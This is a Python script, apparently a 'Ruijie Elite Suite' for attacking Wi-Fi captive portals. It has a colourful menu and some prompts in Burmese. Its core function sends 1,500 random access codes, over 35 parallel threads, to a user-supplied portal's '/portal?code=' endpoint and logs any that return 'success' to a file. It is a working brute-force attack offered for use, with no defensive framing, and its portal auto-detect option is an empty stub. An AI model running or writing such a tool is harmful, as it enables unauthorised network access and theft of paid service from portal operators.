import concurrent.futures
import datetime
import random
import string
import sys
import time
import httpx

# ====================================================
# 🌟 RUIJIE NEXUS ELITE SUITE v5.0 [ULTRA-PREMIUM MOD]
# ====================================================

# ANSI Color Codes for Premium UI
C_CYAN = "\033[96m"
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_MAGENTA = "\033[95m"
C_RED = "\033[91m"
C_WHITE = "\033[97m"
C_RESET = "\033[0m"
C_BOLD = "\033[1m"

def clear_screen():
    print("\033[H\033[J", end="")

def banner():
    print(f"{C_CYAN}{C_BOLD}╔══════════════════════════════════════════════════╗{C_RESET}")
    print(f"{C_CYAN}{C_BOLD}║{C_MAGENTA}          ⚡ RUIJIE ELITE SUITE v5.0 ⚡           {C_CYAN}{C_BOLD}║{C_RESET}")
    print(f"{C_CYAN}{C_BOLD}║{C_YELLOW}        [ Cyberpunk Multi-Threaded Engine ]       {C_CYAN}{C_BOLD}║{C_RESET}")
    print(f"{C_CYAN}{C_BOLD}╚══════════════════════════════════════════════════╝{C_RESET}")

def test_code(url, code):
    target_url = f"{url}/portal?code={code}"
    try:
        response = httpx.get(target_url, timeout=2.5, follow_redirects=True)
        if response.status_code == 200 and "success" in response.text.lower():
            return code
    except Exception:
        pass
    return None

def save_code(code):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("valid_codes.txt", "a") as f:
        f.write(f"[{timestamp}] CODE: {code}\n")

def elite_range_scanner():
    print(f"\n{C_MAGENTA}╔══════════════════════════════════════════════════╗{C_RESET}")
    print(f"{C_MAGENTA}║         🔥 TURBO ELITE RANGE SCANNER             ║{C_RESET}")
    print(f"{C_MAGENTA}╚══════════════════════════════════════════════════╝{C_RESET}")
    
    portal_url = input(f"{C_YELLOW} ┣ 🌐 Enter Portal URL ➔ {C_WHITE}").strip()
    if not portal_url:
        print(f"{C_RED} ┗ ❌ [Error] Portal URL cannot be empty!{C_RESET}")
        return

    start_str = input(f"{C_YELLOW} ┣ 🔤 စတင်မည့် စာလုံး/နံပါတ် (ဥပမာ - 4 သို့မဟုတ် a) ➔ {C_WHITE}").strip()
    end_str = input(f"{C_YELLOW} ┣ 🔤 ရပ်တန့်မည့် စာလုံး/နံပါတ် (ဥပမာ - 7 သို့မဟုတ် z) ➔ {C_WHITE}").strip()
    length_str = input(f"{C_YELLOW} ┗ 📏 စုစုပေါင်း ကုတ်အအရွယ် (Length, ဥပမာ - 6) ➔ {C_WHITE}").strip()

    if not start_str or not end_str or not length_str:
        print(f"\n{C_RED}❌ [Error] All fields are mandatory!{C_RESET}")
        return

    try:
        length = int(length_str)
    except ValueError:
        print(f"\n{C_RED}❌ [Error] Length must be a valid integer.{C_RESET}")
        return

    start_char = start_str[0]
    end_char = end_str[0]

    print(f"\n{C_GREEN}🚀 [Initializing Turbo Scanner] Range: '{start_char}' ➔ '{end_char}' | Length: {length}{C_RESET}\n")
    
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
    found_count = 0
    max_workers = 35  # Maximum parallel processing speed
    scanned_count = 0

    def worker(_):
        nonlocal scanned_count
        random_mid = ''.join(random.choices(chars, k=length - 1))
        code = start_char + random_mid
        scanned_count += 1
        return test_code(portal_url, code)

    start_time = time.time()
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(worker, i) for i in range(1500)]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    print(f"\n{C_GREEN}{C_BOLD}✨ [BINGO! VALID CODE FOUND] ➔ {result}{C_RESET}")
                    save_code(result)
                    found_count += 1
                else:
                    sys.stdout.write(f"{C_CYAN}.{C_RESET}")
                    sys.stdout.flush()
    except KeyboardInterrupt:
        print(f"\n{C_RED}⚠️ [Warning] Scan aborted by user interaction.{C_RESET}")

    elapsed_time = time.time() - start_time
    print(f"\n\n{C_YELLOW}🏁 [Scan Summary] Time: {elapsed_time:.2f}s | Valid Found: {found_count}{C_RESET}")
    print(f"{C_GREEN}💾 Successfully saved to 'valid_codes.txt'.{C_RESET}")

def main_menu():
    while True:
        clear_screen()
        banner()
        print(f"{C_WHITE}┌──────────────────────────────────────────────────┐{C_RESET}")
        print(f"{C_WHITE}│{C_CYAN}  [1] 🔍 Auto-Detect Wi-Fi Portal URL             {C_WHITE}│{C_RESET}")
        print(f"{C_WHITE}│{C_CYAN}  [2] ⚡ Launch Cyber Elite Turbo Scanner         {C_WHITE}│{C_RESET}")
        print(f"{C_WHITE}│{C_CYAN}  [3] 📂 View Saved Valid Codes Archive           {C_WHITE}│{C_RESET}")
        print(f"{C_WHITE}│{C_CYAN}  [4] 🧹 Clear Saved Codes History                {C_WHITE}│{C_RESET}")
        print(f"{C_WHITE}│{C_CYAN}  [5] 🚪 Terminate Suite                          {C_WHITE}│{C_RESET}")
        print(f"{C_WHITE}└──────────────────────────────────────────────────┘{C_RESET}")
        
        choice = input(f"{C_MAGENTA}{C_BOLD} ⚡ Select Command [1-5] ➔ {C_WHITE}").strip()
        
        if choice == '1':
            print(f"\n{C_YELLOW}⚙️ [Info] Scanning network interfaces for portal URL...{C_RESET}")
            input(f"\n{C_CYAN}Press Enter to return...{C_RESET}")
        elif choice == '2':
            elite_range_scanner()
            input(f"\n{C_CYAN}Press Enter to return to main menu...{C_RESET}")
        elif choice == '3':
            try:
                with open("valid_codes.txt", "r") as f:
                    print(f"\n{C_GREEN}╔══════════════════════════════════════════════════╗{C_RESET}")
                    print(f"{C_GREEN}║             📂 SECURE ARCHIVE LOG                ║{C_RESET}")
                    print(f"{C_GREEN}╚══════════════════════════════════════════════════╝{C_RESET}")
                    print(f"{C_WHITE}{f.read()}{C_RESET}")
            except FileNotFoundError:
                print(f"\n{C_YELLOW}📂 [Info] Archive is currently empty.{C_RESET}")
            input(f"\n{C_CYAN}Press Enter to return to main menu...{C_RESET}")
        elif choice == '4':
            try:
                open("valid_codes.txt", "w").close()
                print(f"\n{C_GREEN}🧹 [Success] History cleared completely.{C_RESET}")
            except Exception:
                print(f"\n{C_RED}❌ [Error] Failed to clear history.{C_RESET}")
            input(f"\n{C_CYAN}Press Enter to return...{C_RESET}")
        elif choice == '5':
            print(f"\n{C_MAGENTA}👋 Shutting down Elite Suite. Stay secure!{C_RESET}")
            sys.exit(0)
        else:
            print(f"\n{C_RED}❌ [Error] Invalid option selected!{C_RESET}")
            input(f"\n{C_CYAN}Press Enter to continue...{C_RESET}")

if __name__ == "__main__":
    main_menu()
    
